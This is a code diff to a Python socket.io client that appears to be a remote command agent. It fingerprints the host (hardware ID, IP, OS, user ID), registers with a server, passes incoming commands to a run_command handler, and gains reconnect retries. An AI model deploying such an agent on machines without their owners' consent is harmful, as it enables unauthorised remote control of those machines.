@@ -1,12 +1,14 @@
 import socketio
+from auth import get_user_id
 from command_handler import run_command
 from utils.system_info import get_hwid, get_ip, get_os
-from config import SERVER_URL 
+from config import WEBSOCKET_URL 
 import sys
 import os
 import zipfile
 import io
 import shutil
+import time
 
 sio = socketio.Client()
 
@@ -21,15 +23,34 @@ def disconnect():
 
 
 def connect_to_server():
-    print("[*] Connecting to server...")
-    sio.connect(SERVER_URL)
-    sio.wait()
+    max_retries = 5
+    retry_delay = 5
+    
+    for attempt in range(max_retries):
+        print(f"Connection attempt {attempt + 1}/{max_retries}...")
+        try:
+            sio.connect(WEBSOCKET_URL)
+            sio.wait()
+            return
+        except Exception as e:
+            print(f"Connection failed: {e}")
+            print(f"Retrying in {retry_delay} seconds...")
+            
+        if attempt < max_retries - 1:
+            time.sleep(retry_delay)
+        else:
+            print("Max retries exceeded. Exiting...")
+            sys.exit(1)
+        
 
 def register_client():
+    user_id = get_user_id()
+
     client_info = {
         'hwid': get_hwid(),
         'ip': get_ip(),
-        'os': get_os()
+        'os': get_os(),
+        'userId': user_id
     }
     sio.emit("register", client_info)
 
